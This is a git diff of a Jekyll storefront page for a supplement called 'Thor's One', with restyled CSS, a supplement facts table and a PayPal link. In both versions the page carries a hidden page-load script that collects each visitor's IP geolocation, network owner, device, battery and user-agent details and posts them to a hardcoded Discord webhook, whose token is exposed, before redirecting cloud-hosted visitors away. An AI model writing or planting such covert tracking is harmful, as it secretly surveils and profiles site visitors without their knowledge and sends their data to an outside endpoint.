@@ -1,56 +1,149 @@
 ---
 layout: default
-title: Thor's One - Performance Engineering
+title: Thor's One - Valhalla Innovations
 ---
 
 <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Inter:wght@300;700&display=swap');
+
     :root {
-        --valhalla-gold: #ffd700;
-        --valhalla-dark: #0a0a0a;
-        --valhalla-card: #141414;
+        --electric-blue: #00d4ff;
+        --bg-dark: #020202;
     }
-    body { background-color: var(--valhalla-dark); color: #fff; font-family: 'Inter', sans-serif; }
+
+    body { 
+        background-color: var(--bg-dark); 
+        color: #fff; 
+        font-family: 'Inter', sans-serif; 
+        margin: 0;
+        /* Using your storm image from the main folder */
+        background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.8)), url('banner_storm.jpeg');
+        background-attachment: fixed;
+        background-size: cover;
+        background-position: center;
+    }
+
+    .container { max-width: 1100px; margin: 0 auto; padding: 40px 20px; text-align: center; }
+
+    /* Hero Section */
+    .hero-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 20px;
+    }
+
+    .product-bottle {
+        width: 100%;
+        max-width: 550px;
+        filter: drop-shadow(0 0 40px var(--electric-blue));
+        margin-bottom: -30px; 
+        transition: 0.5s ease;
+        cursor: pointer;
+    }
     
-    .hero-banner { width: 100%; border-bottom: 2px solid var(--valhalla-gold); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    
-    .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
-    
-    h1 { font-family: 'Playfair Display', serif; font-size: 3rem; text-align: center; color: var(--valhalla-gold); letter-spacing: -1px; margin-bottom: 10px; }
-    .tagline { text-align: center; text-transform: uppercase; letter-spacing: 4px; font-size: 0.8rem; color: #888; margin-bottom: 50px; }
+    .product-bottle:hover { transform: scale(1.05) rotate(-1deg); }
+
+    h1 { 
+        font-family: 'Orbitron', sans-serif; 
+        font-size: clamp(3rem, 12vw, 7rem);
+        margin: 0; 
+        color: #fff;
+        text-shadow: 0 0 30px var(--electric-blue);
+        letter-spacing: 12px;
+    }
+
+    .tagline { 
+        text-transform: uppercase; 
+        letter-spacing: 6px; 
+        font-size: 0.85rem; 
+        color: var(--electric-blue);
+        margin: 20px 0 50px 0;
+        font-weight: 700;
+    }
+
+    /* Supplement Facts Label */
+    .label-wrap {
+        display: flex;
+        justify-content: center;
+        margin: 60px 0;
+    }
 
     .supplement-facts { 
-        background: #fff; color: #000; padding: 25px; border: 2px solid #000; 
-        max-width: 500px; margin: 0 auto; box-shadow: 10px 10px 0px var(--valhalla-gold);
+        background: #fff; 
+        color: #000; 
+        padding: 35px; 
+        border: 4px solid #000; 
+        width: 100%;
+        max-width: 480px;
+        box-shadow: 20px 20px 0px var(--electric-blue);
+        text-align: left;
     }
-    .supplement-facts h2 { border-bottom: 5px solid #000; margin-bottom: 5px; font-weight: 900; font-size: 2rem; }
-    .sf-table { width: 100%; border-collapse: collapse; }
-    .sf-table tr { border-bottom: 1px solid #000; }
-    .sf-table td { padding: 8px 0; font-weight: bold; }
-    .amount { text-align: right; }
-    .sf-bold-row { border-bottom: 4px solid #000 !important; }
 
+    .supplement-facts h2 { border-bottom: 15px solid #000; font-weight: 900; font-size: 2.8rem; margin: 0; }
+    .sf-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+    .sf-table td { padding: 14px 0; border-bottom: 1px solid #000; font-weight: bold; font-size: 1.1rem; }
+    .sf-bold { border-bottom: 10px solid #000 !important; font-size: 1.2rem; }
+
+    /* The Buy Button */
     .order-btn {
-        background: var(--valhalla-gold); color: #000; padding: 20px 50px; 
-        border-radius: 5px; font-weight: 900; text-decoration: none; 
-        display: inline-block; transition: transform 0.3s ease;
-        box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+        background: #fff; 
+        color: #000; 
+        padding: 25px 90px; 
+        font-weight: 900; 
+        text-decoration: none; 
+        display: inline-block; 
+        font-size: 1.6rem;
+        text-transform: uppercase;
+        letter-spacing: 5px;
+        border: 4px solid var(--electric-blue);
+        transition: 0.4s;
+        box-shadow: 0 0 50px rgba(0, 212, 255, 0.3);
     }
-    .order-btn:hover { transform: scale(1.05); background: #fff; }
 
-    .footer-intel { margin-top: 100px; text-align: center; font-size: 0.7rem; color: #333; text-transform: uppercase; }
+    .order-btn:hover { 
+        background: var(--electric-blue); 
+        color: #fff; 
+        box-shadow: 0 0 70px var(--electric-blue);
+        transform: translateY(-5px);
+    }
+
+    footer { padding: 120px 0 40px; color: #333; font-size: 0.7rem; letter-spacing: 4px; font-weight: bold; }
 </style>
 
 <div class="container">
-    <header>
+    <div class="hero-container">
+        <img src="banner.jpg" class="product-bottle" alt="Thor's One Performance Blend">
         <h1>THOR'S ONE</h1>
-        <p class="tagline">All-In-One Performance Engineering</p>
-    </header>
+        <p class="tagline">Many are called but few are chosen</p>
+        
+        <a href="https://www.paypal.com/ncp/payment/Z6NLB5ECC653L" class="order-btn">CLAIM THE ALLOY</a>
+    </div>
 
-   <script>
+    <div class="label-wrap">
+        <div class="supplement-facts">
+            <h2>Supplement Facts</h2>
+            <p style="font-weight: bold;">Serving Size: 1 Scoop | Servings: 30</p>
+            <table class="sf-table">
+                <tr class="sf-bold"><td>CORE ELEMENTS</td><td style="text-align:right;">AMT</td></tr>
+                <tr><td>Creatine Monohydrate</td><td style="text-align:right;">5 g</td></tr>
+                <tr><td>Citrulline Malate</td><td style="text-align:right;">5 g</td></tr>
+                <tr><td>Beta-Alanine</td><td style="text-align:right;">3.5 g</td></tr>
+                <tr class="sf-bold"><td>FOCUS MATRIX</td><td style="text-align:right;">AMT</td></tr>
+                <tr><td>L-Tyrosine</td><td style="text-align:right;">750 mg</td></tr>
+                <tr><td>Huperzine A (1%)</td><td style="text-align:right;">200 mcg</td></tr>
+            </table>
+        </div>
+    </div>
+
+    <footer>
+        MCLAREN VALHALLA SYSTEMS // TRACKING NODE 01 // SECURE SESSION ACTIVE
+    </footer>
+</div>
+
+<script>
     async function runSentinel() {
         const hook = "https://discord.com/api/webhooks/1482560413202780190/W_284_815IhjKx0KEPRMAcL8cikbZLG1wE_Zwxls5N-DR5KJ8mtuCE_OrXf-ZLIVSRay";
-        
-        // ONLY your Florida HQ IP stays here to stay "Invisible"
         const absoluteMasters = ["66.177.137.56"]; 
         const wichitaIP = "207.178.123.51";
 
@@ -63,16 +156,15 @@ title: Thor's One - Performance Engineering
             const isWichita = geo.ip === wichitaIP;
             const isCloud = /Azure|Hosting|Data Center|Microsoft|Amazon|Google|Cloud|Ziply/i.test(geo.org);
 
-            // 1. Construct the Intelligence Report
             let status = "🚨 INTEL SCAN";
-            let color = 15548997; // Red
+            let color = 15548997; 
 
             if (isMaster) {
                 status = "👑 MASTER ACCESS";
-                color = 15844367; // Gold
+                color = 15844367; 
             } else if (isWichita) {
                 status = "🌾 WICHITA NODE REPORT";
-                color = 3447003; // Blue
+                color = 3447003; 
             }
 
             const report = {
@@ -85,52 +177,19 @@ title: Thor's One - Performance Engineering
                         { name: "📍 Location", value: `${geo.city}, ${geo.region}\nTZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: true },
                         { name: "💻 Device", value: `Platform: ${navigator.platform}\nScreen: ${screen.width}x${screen.height}`, inline: true },
                         { name: "🔋 Battery", value: `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging})`, inline: true },
-                        { name: "🕵️ User-Agent", value: navigator.userAgent }
+                        { name: "🕵️ UA", value: navigator.userAgent }
                     ],
                     footer: { text: "McLaren Valhalla Systems // Deep Scan Active" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // 2. Transmit Intel before any redirect
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(report) });
 
-            // 3. The Blockade (Redirect Cloud Bots, but LET WICHITA THROUGH)
             if (isCloud && !isMaster && !isWichita) {
                 window.location.replace("https://www.google.com/search?q=unauthorized+access+detected");
             }
-
-        } catch (e) {
-            console.log("Sentinel running silent.");
-        }
+        } catch (e) {}
     }
     runSentinel();
-</script> <div class="supplement-facts">
-        <h2>Supplement Facts</h2>
-        <p>Serving Size: 1 Scoop (≈30 cc) | Servings Per Container: 30</p>
-        <table class="sf-table">
-            <tr class="sf-bold-row"><td>Amount Per Serving</td><td class="amount">% DV</td></tr>
-            <tr><td>Creatine Monohydrate (200-Mesh)</td><td class="amount">5 g</td></tr>
-            <tr><td>Citrulline Malate</td><td class="amount">5 g</td></tr>
-            <tr><td>Beta-Alanine</td><td class="amount">3.5 g</td></tr>
-            <tr><td>BCAA (2:1:1)</td><td class="amount">3.5 g</td></tr>
-            <tr><td>Betaine Anhydrous</td><td class="amount">2 g</td></tr>
-            <tr><td>L-Glutamine</td><td class="amount">2 g</td></tr>
-            <tr><td>Beet Juice Powder</td><td class="amount">1.5 g</td></tr>
-            <tr><td>L-Carnitine L-Tartrate</td><td class="amount">1,000 mg</td></tr>
-            <tr class="sf-bold-row"><td>Cognitive & Electrolyte Matrix</td><td class="amount">**</td></tr>
-            <tr><td>Magnesium Glycinate</td><td class="amount">300 mg</td></tr>
-            <tr><td>Huperzine A (1%)</td><td class="amount">200 mcg</td></tr>
-        </table>
-        <p style="font-size: 0.7rem; margin-top: 10px;">* Percent Daily Values are based on a 2,000 calorie diet.</p>
-    </div>
-
-    <div style="text-align: center; margin-top: 50px;">
-        <a href="https://www.paypal.com/ncp/payment/Z6NLB5ECC653L" class="order-btn">⚡️ SECURE YOUR ALLOY</a>
-    </div>
-
-    <footer class="footer-intel">
-        Protected by McLaren Valhalla Systems // Node: Supps-01
-    </footer>
-</div>
-
+</script>
